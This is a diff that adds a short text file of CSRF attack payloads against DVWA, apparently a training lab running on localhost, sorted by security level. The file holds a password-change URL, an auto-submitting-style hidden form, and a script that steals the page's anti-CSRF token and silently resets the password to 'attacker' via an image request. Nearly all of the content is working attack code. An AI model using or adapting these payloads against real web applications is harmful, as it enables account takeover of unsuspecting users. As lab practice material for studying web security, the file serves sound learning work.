@@ -1,0 +1,20 @@
+
+```txt
+# CSRF Payloads for DVWA
+
+# Low 级别
+http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change#
+
+# Medium 级别（需部署在目标域名下）
+<form action="http://127.0.0.1/DVWA/vulnerabilities/csrf/" method="GET">
+  <input type="hidden" name="password_new" value="hacked" />
+  <input type="hidden" name="password_conf" value="hacked" />
+  <input type="hidden" name="Change" value="Change" />
+</form>
+
+# High 级别（需结合 XSS）
+<script>
+var token = document.getElementsByName('user_token')[0].value;
+var url = 'http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=attacker&password_conf=attacker&Change=Change&user_token=' + token;
+new Image().src = url;
+</script>
